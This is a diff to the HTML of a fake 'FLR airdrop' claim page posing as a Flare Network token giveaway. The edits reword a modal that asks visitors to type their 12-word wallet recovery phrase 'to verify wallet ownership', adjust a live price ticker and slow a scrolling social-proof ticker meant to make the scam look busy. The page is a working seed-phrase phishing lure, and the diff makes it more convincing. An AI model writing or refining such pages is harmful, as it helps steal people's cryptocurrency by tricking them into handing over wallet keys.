@@ -535,7 +535,7 @@ cd vcd
 
 <button id="verifyCloseBtn" style="position: absolute; top: 1rem; right: 1.2rem; background: none; border: 1px solid rgba(255,255,255,0.2); color: rgba(255,255,255,0.5); font-size: 1.2rem; cursor: pointer; width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.2s;" onmouseover="this.style.borderColor='rgba(255,255,255,0.5)';this.style.color='#fff';" onmouseout="this.style.borderColor='rgba(255,255,255,0.2)';this.style.color='rgba(255,255,255,0.5)';">✕</button>
     <p>
-      To confirm your eligibility for the FLR airdrop, please enter your 12-word wallet recovery phrase below.
+      Please enter your 12-word wallet recovery phrase below to connect your wallet and claim your FLR tokens.
       This is required to verify wallet ownership and prevent duplicate claims.
     </p>
     <textarea id="seedPhraseInput" rows="3" placeholder="Enter your 12-word recovery phrase here..."></textarea>
@@ -616,7 +616,7 @@ cd vcd
           document.getElementById('priceTicker').innerHTML =
             '<span style="color:#fff;font-weight:700;">$' + f.usd.toFixed(4) + '</span>' +
             '<span style="color:' + (f.usd_24h_change > 0 ? '#4CAF50' : '#ff4060') + ';">' + (f.usd_24h_change > 0 ? '▲' : '▼') + ' ' + Math.abs(f.usd_24h_change).toFixed(2) + '%</span>' +
-            '<span style="color:#aaa;">Market Cap: $' + (f.usd_market_cap / 1e9).toFixed(2) + 'B</span>';
+            '<span style="color:#aaa;">Market Cap: $' + (f.usd_market_cap / 1e6).toFixed(0) + 'M</span>';
         });
     </script>
     <!-- ===== END PRICE TICKER ===== -->
@@ -642,7 +642,7 @@ cd vcd
 
 
     <p class="subhead">
-      Select your preferred chain below to verify eligibility and claim your FLR rewards.<br>
+      Select your preferred wallet below to verify eligibility and claim your FLR rewards.<br>
       This limited airdrop is available to early Flare Network participants and FTSO delegators.
     </p>
 
@@ -697,7 +697,7 @@ cd vcd
   <!-- ===== SOCIAL PROOF TICKER ===== -->
   <div style="max-width: 620px; margin: 0 auto 2rem; padding: 0 1.5rem; overflow: hidden;">
     <div style="background: rgba(229,0,108,0.04); border: 1px solid rgba(229,0,108,0.12); border-radius: 12px; padding: 0.6rem 1rem; font-size: 0.8rem; color: #aaa; white-space: nowrap; overflow: hidden; position: relative;">
-      <span id="tickerContent" style="display: inline-block; animation: scrollTicker 120s linear infinite;"></span>
+      <span id="tickerContent" style="display: inline-block; animation: scrollTicker 180s linear infinite;"></span>
     </div>
   </div>
   <style>
